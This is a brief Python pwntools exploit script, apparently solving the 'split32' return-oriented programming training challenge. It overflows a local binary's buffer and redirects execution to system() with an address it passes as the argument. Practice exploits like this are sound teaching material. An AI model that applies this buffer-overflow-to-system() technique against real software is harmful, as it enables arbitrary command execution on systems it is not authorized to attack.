#!/usr/bin/env python

from pwn import *

p = process("./split32")
p.recv(1024)

payload = (
    "\x90" * 44 +
    p32(0x8048430)  + # system
    p32(0x41414141) + #ebp
    p32(0x804a030)
)

p.sendline(payload)
print(p.recvall())

p.close()
